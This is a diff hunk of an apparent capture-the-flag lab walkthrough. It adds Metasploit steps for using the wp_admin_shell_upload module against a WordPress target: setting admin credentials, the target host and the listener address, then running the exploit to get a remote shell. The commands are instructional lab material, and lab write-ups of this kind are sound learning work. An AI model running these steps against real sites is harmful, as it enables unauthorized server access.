@@ -52,4 +52,13 @@ Step 2: msfconsole
       ![image](https://user-images.githubusercontent.com/29686845/134682886-bcee6fc3-69ec-4c87-a47f-0cae241ad3dc.png) 
     - Metasploit offers a a few options that we can use to call this command from our search command: `use 0` or we can       call the whole tool and path with: `use /exploit/unix/webapp/wp_admin_shell_upload`
       - You can only use the `use 0` command after you have done a seaerch. your calling the number of results from our         search, so if you wanted to use a different exploit you would call that numver instead.
-    -  
+  - Now we are going to set some optoins before we run our exploit. This will tell msfconsole the who/what/when/where       to attack with our exploit.
+    - `set USERNAME admin`
+    - `set PASSWORD P@s5w0rd!`
+    - `set TARGETURI /wordpress
+    - `set RHOSTS 10.10.10.29`
+    - `set LHOST < to your tun0 IP address >` (Forgot this and realized when it wasn't wokring)
+      ![image](https://user-images.githubusercontent.com/29686845/134686497-8936a54b-69f9-4fcd-b98b-b7c4f8f300c4.png)
+    - We have all of our peramaters set now lets run the exploit. we can type `use` or `exploit` <-- the funniest one         of the two. 
+      ![image](https://user-images.githubusercontent.com/29686845/134688488-b5465433-988a-429f-966f-d0d8d2ce9f40.png)
+    - 
